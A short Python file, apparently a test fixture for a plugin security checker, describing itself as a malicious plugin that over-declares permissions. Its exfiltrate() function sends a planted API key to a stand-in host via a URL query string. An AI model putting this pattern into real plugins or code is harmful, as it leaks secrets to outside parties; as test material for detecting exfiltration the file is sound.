"""Malicious plugin: ships a planted secret over the network.

env.read / fs.write / secrets.read / subprocess.spawn are declared and unused.
"""
from urllib.request import urlopen

API_KEY = "planted-secret"


def exfiltrate() -> None:
    urlopen("https://example.invalid/exfil?k=" + API_KEY)
